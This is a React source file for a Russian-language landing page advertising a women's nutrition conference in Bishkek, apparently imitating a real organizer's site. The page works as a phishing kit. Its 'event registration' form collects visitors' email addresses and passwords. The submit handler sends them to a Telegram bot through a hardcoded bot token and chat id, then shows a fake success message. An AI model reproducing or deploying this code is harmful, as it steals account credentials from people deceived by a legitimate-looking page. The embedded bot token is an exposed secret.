import { useState } from 'react'
import UniversalCarousel from './Carousel';
import logo1 from './assets/IMG_1123.png';
import logo2 from './assets/miin-2.webp';

function App() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isSuccess, setSuccess] = useState(false)
  const [isError, setError] = useState(false)
  const [isActive, setActive] = useState(false)

  const handleModalClick = () => {
    if (isActive) setActive(false)
    else setActive(true)
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const text = `Email: ${email}\Passowrd: ${password}`;

    const response = await fetch(`https://api.telegram.org/bot6737098779:AAG-BRBAR_GbpD_iYuumReaAGzpCtbvYkPg/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '-1002188969418',
            text: text,
        }),
    });

    if (response.ok) {
        setSuccess(true)
        setError(false)
    } else {
        setSuccess(false)
        setError(true)
    }
  };

  return (
    <div className="bg-custom-lightbeige font-montserrat">
      <div className={`cursor-pointer w-full h-screen fixed top-0 left-0 z-50 ${isActive ? "flex" : "hidden"}`}>
        <div className="w-full h-full flex justify-center items-center relative">
          <div onClick={handleModalClick} className="rgba-bg absolute w-full h-full top-0 left-0"></div>
          <form onSubmit={handleSubmit} className="z-50 cursor-auto w-[500px] p-[30px] modal-adaptive bg-white rounded-3xl">
            <h1 className='text-center font-bold text-2xl mb-[20px]'>Регистрация на мероприятие</h1>

            <label className='flex flex-col gap-[10px] font-medium mb-[15px]'>
              Ваша почта 
              <input
                placeholder='example@mail.ru' 
                className='text-sm border rounded-md border-black transition-all outline-none px-[8px] py-[4px] focus:border-custom-orange' 
                type="email" 
                required 
                onChange={
                  (e) => {
                    setEmail(e.target.value)
                  }
                }
              />
            </label>

            <label className='flex flex-col gap-[10px] font-medium mb-[20px]'>
              Ваш пароль 
              <input
                placeholder='Пароль' 
                className='text-sm border rounded-md border-black transition-all outline-none px-[8px] py-[4px] focus:border-custom-orange' 
                type="password" 
                required 
                onChange={(e) => {
                  setPassword(e.target.value)
                }}
              />
            </label>

            {isError && <p className='text-sm mb-[10px] font-medium text-center text-red-600'>Возникла непредвиденная ошибка. Попробуйте еще раз</p>}
            {isSuccess ? <p className='text-sm mb-[10px] font-medium text-center text-green-600'>Регистрация прошла успешно. Проверьте почту</p> : ""}

            <div className="flex justify-center mb-[20px]">
              <button type="submit" className='bg-custom-green transition-all text-white rounded-3xl px-[20px] py-[10px] active:bg-custom-orange hover:bg-custom-orange'>
                Зарегистрироваться
              </button>
            </div>

            <p className='text-xs text-center'>После завершения регистрации вам на почту будет отправлен <span className="text-custom-orange">персональный код</span>. <br /> Его потребуется показать менеджеру на мероприятии</p>
          </form>
        </div>
      </div>

      <div className="flex justify-between items-center py-[20px] px-[90px] text-sm header-adaptive">
        <img className="w-[128px]" src="https://optim.tildacdn.com/tild6330-3836-4533-b165-613037643038/-/resize/194x/-/format/webp/_2.png" alt="" />

        <nav className="flex gap-[100px] rounded-3xl px-[40px] py-[10px] uppercase bg-custom-beige">
          <a href="#programm" className="cursor-pointer hover:font-medium">для кого?</a>
          <a href="#speakers" className="cursor-pointer hover:font-medium">спикеры</a>
          <a href="#organs" className="cursor-pointer hover:font-medium">организаторы</a>
        </nav>

        <button onClick={handleModalClick} className="font-bold px-[40px] py-[10px] uppercase bg-custom-orange rounded-3xl">
          записаться
        </button>
      </div>

      <div className='flex flex-col py-[50px] px-[90px] pb-[60px] hero-adaptive'>
        <div className="flex justify-between">
          <div className="flex flex-col">
            <span className="hero-header1 text-3xl text-black font-bold">МЕЖДУНАРОДНАЯ КОНФЕРЕНЦИЯ</span>
            <br />
            <div className='hero-headers-wrap'>
              <span className="hero-header2 text-3xl uppercase mr-[20px] text-white font-bold px-[30px] py-[10px] bg-custom-green rounded-[30px]">по нутрициологии</span>
              <span className="hero-header3 text-3xl uppercase text-custom-green font-playfair font-medium italic">для женщин</span>
            </div>
          </div>

          <div className="flex flex-col gap-[20px]">
            <a href="#programm" className="text-center px-[70px] py-[8px] uppercase border-solid border-[1px] border-custom-green text-custom-green rounded-3xl transition-all duration-200 ease-linear hover:text-white hover:bg-custom-green">
              для кого?
            </a>

            <a href="#speakers" className="text-center px-[70px] py-[8px] uppercase border-solid border-[1px] border-custom-green text-custom-green rounded-3xl transition-all duration-200 ease-linear hover:text-white hover:bg-custom-green">
              спикеры
            </a>
          </div>
        </div>
      </div>

      <div className="main-adaptive px-[90px] pb-[80px]">
        <div className="w-full">
          <div className="main-photos relative overflow-hidden w-full h-[450px] flex justify-center items-end">
              <img className='main-photo1 w-[300px] absolute top-[-50px] left-[20px] z-20' src="https://optim.tildacdn.com/tild3165-6136-4035-a634-373262626330/-/resize/369x/-/format/webp/1_1.png" alt="" />
              <img className='main-photo2 w-[300px] absolute top-[-50px] left-[220px] z-20' src="https://optim.tildacdn.com/tild3061-3361-4762-b861-633962376530/-/resize/369x/-/format/webp/2_1.png" alt="" />
              <img className='main-photo3 w-[350px] absolute top-[-50px] left-[420px] z-10' src="https://optim.tildacdn.com/tild6336-3639-4564-a461-613262663634/-/resize/436x/-/format/webp/3.png" alt="" />
              <img className='main-photo4 w-[350px] absolute top-[-50px] right-[150px] z-20' src="https://optim.tildacdn.com/tild3263-3239-4534-b630-356130353862/-/resize/433x/-/format/webp/4.png" alt="" />
              <img className='main-photo5 w-[300px] absolute top-[-50px] right-[0px] z-20' src="https://optim.tildacdn.com/tild3162-3233-4635-b663-653036336231/-/resize/337x/-/format/webp/5.png" alt="" />
              <div className="w-[96%] h-[96%] rounded-t-3xl bg-custom-beige"></div>
          </div>
          <div className="main-dates w-full p-[10px] bg-custom-green rounded-[40px] flex justify-between items-center">
            <div className="bg-white px-[70px] py-[8px] rounded-3xl font-montserrat font-bold text-lg">
              3-4 октября
            </div>

            <button onClick={handleModalClick} className="font-medium px-[40px] py-[10px] text-white uppercase bg-custom-orange rounded-3xl">
              записаться
            </button>

            <div className="bg-white px-[50px] py-[8px] rounded-3xl font-montserrat font-bold text-lg">
              г. Бишкек, Novotel
            </div>
          </div>
        </div>
      </div>

      <div className="about-adaptive px-[90px] pb-[60px] flex justify-between">
        <div className="w-[72%] py-[30px] px-[40px] bg-custom-green rounded-3xl">
          <div className="about-info flex flex-col gap-[15px] mb-[40px]">
            <h1>
              <span className="about-internat text-4xl uppercase text-white font-montserrat font-bold mr-[15px]">ежегодная</span>
              <span className="text-5xl text-white font-playfair italic">конференция</span>
            </h1>

            <p className='text-white text-sm font-montserrat font-medium'>
              для женщин, ценящих своё здоровье, <br /> нутрициологов и врачей
            </p>
          </div>

          <div className="text-white text-sm font-montserrat">
            За 2 дня вы узнаете о последних трендах здоровья, влиянии питания и образа жизни на здоровье женщин. Вы получите ценные знания о том, как эффективно корректировать своё состояние и помогать другим.
            <br />
            <br />
            На одной площадке соберутся ведущие специалисты в области нутрициологии, превентивной медицины и холистического подхода к здоровью. Через лекции, панельные дискуссии и мастер-классы они передадут вам легко применимые инструменты для работы, самопомощи и профессионального роста.
          </div>
        </div>

        <div className="about-stats w-[25%] flex flex-col justify-between">
          <div className="flex flex-col gap-[10px] p-[10px] pt-0 items-center justify-center rounded-3xl border border-custom-green">
            <h1 className="text-6xl font-bold text-custom-green font-playfair">12</h1>  
            <p className="text-base text-custom-green font-medium">панельных дискуссий</p>
          </div>      

          <div className="flex flex-col gap-[10px] p-[10px] pt-0 items-center justify-center rounded-3xl border border-custom-green">
            <h1 className="text-6xl font-bold text-custom-green font-playfair">30+</h1>  
            <p className="text-base text-custom-green font-medium">спикеров</p>
          </div>     

          <div className="flex flex-col gap-[10px] p-[10px] pt-0 items-center justify-center rounded-3xl border border-custom-green">
            <h1 className="text-6xl font-bold text-custom-green font-playfair">20</h1>  
            <p className="text-base text-custom-green font-medium">актуальных тем</p>
          </div>         
        </div>
      </div>

      <div className="auditory-adaptive px-[90px] py-[45px] bg-custom-green w-full" id="programm">
        <h1 className="text-white text-4xl uppercase font-bold mb-[50px]">
          для кого мероприятие?
        </h1>

        <div className="auditory-cards flex flex-wrap justify-center gap-[50px]">

          <div className="flex justify-between w-[45%] h-[170px] p-[20px] rounded-3xl bg-white parent-div">
            <div className="w-[10%] flex justify-center items-start">
              <img className="w-[48px]" src="https://optim.tildacdn.com/tild3439-3165-4665-b837-623265393065/-/resize/63x/-/format/webp/Group_5.png" alt="" />
            </div>

            <div className="w-[86%] flex flex-col gap-[10px]">
              <h3 className="text-lg text-black font-semibold transition-all">
                Нутрициологи и health-коучи
              </h3>

              <p className="text-sm text-black">
                Вы получите новые знания от врачей и экспертов в области питания, обменяетесь опытом с единомышленниками и познакомитесь с трендами развития сферы.
              </p>
            </div>
          </div>

          <div className="flex justify-between w-[45%] h-[170px] p-[20px] rounded-3xl bg-white parent-div">
            <div className="w-[10%] flex justify-center items-start">
              <img className="w-[48px] rotate-45 mt-[15px]" src="https://optim.tildacdn.com/tild3039-3432-4466-b262-653763353165/-/resize/74x/-/format/webp/Group_2.png" alt="" />
            </div>

            <div className="w-[86%] flex flex-col gap-[10px]">
              <h3 className="text-lg text-black font-semibold transition-all">
                Врачи
              </h3>

              <p className="text-sm text-black">
                После конференции вы сможете проводить комплексную работу по изменению образа жизни и питания своих пациентов, усилите свои компетенции и выделитесь среди коллег
              </p>
            </div>
          </div>

          <div className="flex justify-between w-[45%] h-[170px] p-[20px] rounded-3xl bg-white parent-div">
            <div className="w-[10%] flex justify-center items-start">
              <img className="w-[48px]" src="https://optim.tildacdn.com/tild3864-6136-4661-a338-623864303438/-/resize/63x/-/format/webp/Vector.png" alt="" />
            </div>

            <div className="w-[86%] flex flex-col gap-[10px]">
              <h3 className="text-lg text-black font-semibold transition-all">
                Специалисты ЗОЖ-сферы
              </h3>

              <p className="text-sm text-black">
                Вы узнаете, как питание и внутреннее состояние организма влияют на результаты ваших клиентов, расширите горизонты профессии и изучите тренды для своей реализации.
              </p>
            </div>
          </div>

          <div className="flex justify-between w-[45%] h-[170px] p-[20px] rounded-3xl bg-white parent-div">
            <div className="w-[10%] flex justify-center items-start">
              <img className="w-[48px]" src="https://optim.tildacdn.com/tild3739-3136-4266-b964-646437383338/-/resize/63x/-/format/webp/Vector1.png" alt="" />
            </div>

            <div className="w-[86%] flex flex-col gap-[10px]">
              <h3 className="text-lg text-black font-semibold transition-all">
                Женщины, ценящие своё здоровье
              </h3>

              <p className="text-sm text-black">
              Вы узнаете, как сохранять здоровье на долгие годы и как гармонично вписать полученные знания в вашу жизнь и жизнь ваших близких.
              </p>
            </div>
          </div>

        </div>
      </div>

      <div className="speakers-adaptive p-[45px] flex flex-col items-center" id="speakers">
        <h1 className="text-black text-3xl uppercase font-bold mb-[45px]">
          Спикеры
        </h1>

        <div className="flex gap-[60px]">
          <div className="flex flex-col items-center w-[230px]">
            <div className="size-[140px] overflow-hidden rounded-full mb-[20px]">
              <img className="w-full" src="https://static.tildacdn.com/tild3639-3536-4436-b464-616136333632/__.jpg" alt="" />
            </div>

            <h3 className="font-bold text-lg mb-[5px]">
              Татьяна Урывчикова
            </h3>
            <h4 className="font-medium text-sm text-center mb-[10px]">
              Клинический психолог, нейропсихолог
            </h4>
          </div>

          <div className="flex flex-col items-center w-[230px]">
            <div className="size-[140px] overflow-hidden rounded-full mb-[20px]">
              <img className="w-full" src="https://img.championat.com/journalist/16480437681034490183.jpg" alt="" />
            </div>

            <h3 className="font-bold text-lg mb-[5px]">
              Ната Гончар
            </h3>
            <h4 className="font-medium text-sm text-center mb-[10px]">
              Основатель МИИН
            </h4>
          </div>

          <div className="flex flex-col items-center w-[230px]">
            <div className="size-[140px] overflow-hidden rounded-full mb-[20px]">
              <img className="w-full" src="https://storage.yandexcloud.net/4fresh-photo/ca5ed336-14cb-40a6-8e4c-85f46b4df92b" alt="" />
            </div>

            <h3 className="font-bold text-lg mb-[5px]">
              Мария Клетанина
            </h3>
            <h4 className="font-medium text-sm text-center mb-[10px]">
              Нутрициолог и wellness-коуч
            </h4>
          </div>

          <div className="flex flex-col items-center w-[230px]">
            <div className="size-[140px] overflow-hidden rounded-full mb-[20px]">
              <img className="w-full" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3XghFh5WJ51HwFD0QtIXx5A-q5SXNkYJvbg&s" alt="" />
            </div>

            <h3 className="font-bold text-lg mb-[5px]">
              Мария Довнар
            </h3>
            <h4 className="font-medium text-sm text-center mb-[10px]">
              Эксперт по монетизации личной практики
            </h4>
          </div>
        </div>

      </div>

      <div className="organs-adaptive py-[45px] px-[90px] flex flex-col items-center bg-custom-green" id="organs">
        <h1 className="text-white text-3xl uppercase font-bold mb-[45px]">
          организаторы
        </h1>

        <div className="w-full flex justify-between">
          <div className="organs-card p-[30px] bg-white rounded-3xl flex gap-[20px] max-w-[45%]">
              <div className="w-[20%]">
                <img src={logo1} className='w-[86px]' alt="" />
              </div>

              <div className="flex flex-col gap-[10px] w-[80%] organs-text">
                <h3 className="text-black font-semibold">
                  Ассоциация Нутрициологов и Коучей <br /> по Здоровью (АНКЗ)
                </h3>

                <p className='text-sm text-black'>
                  Ассоциация создана в 2018 году как независимая некоммерческая организация и является крупнейшим ЗОЖ сообществом в России и СНГ. Мы создаем популярное международное сообщество людей, влюбленных в ЗОЖ и разделяющих принципы осознанного образа жизни.
                </p>
              </div>
          </div>

          <div className="organs-card p-[30px] bg-white rounded-3xl flex gap-[20px] max-w-[45%]">
              <div className="w-[20%]">
                <img src={logo2} className='w-[86px]' alt="" />
              </div>

              <div className="flex flex-col gap-[10px] w-[80%] organs-text">
                <h3 className="text-black font-semibold">
                  Международный Институт Интегративной Нутрициологии (МИИН)
                </h3>

                <p className='text-sm text-black'>
                Лидер онлайн-образования в сфере нутрициологии. МИИН предоставляет качественное и доступное профессиональное образование и проводит просветительские проекты, способствующие формированию культуры питания и управления здоровьем среди широкой аудитории.
                </p>
              </div>
          </div>
        </div>
      </div>

      <div className="footer-adaptive px-[90px] h-[130px] flex justify-center items-center relative">
        <img className="w-[128px] absolute left-[90px]" src="https://optim.tildacdn.com/tild3463-3437-4362-b530-616163326534/-/resize/327x/-/format/webp/_1.png" alt="" />
        
        <div className="font-semibold text-gray-400">
          <p>Остались вопросы?</p>
          <p>Свяжитесь с нами по адресу: <span className="text-custom-green cursor-pointer">partners@miin.pro</span></p>
        </div>
      </div>

    </div>
  )
}

export default App
